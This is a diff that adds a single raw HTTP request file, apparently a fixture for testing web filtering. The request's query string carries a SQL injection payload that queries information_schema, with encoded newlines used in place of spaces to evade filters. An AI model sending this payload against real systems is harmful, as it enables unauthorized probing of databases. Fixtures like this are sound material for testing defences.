@@ -1,0 +1,4 @@
+GET /a?q=1%0aand%0a1%3D(select%0acount(*)%0afrom%0ainformation_schema.columns) HTTP/1.1
+Host: demo.example.com
+Connection: close
+
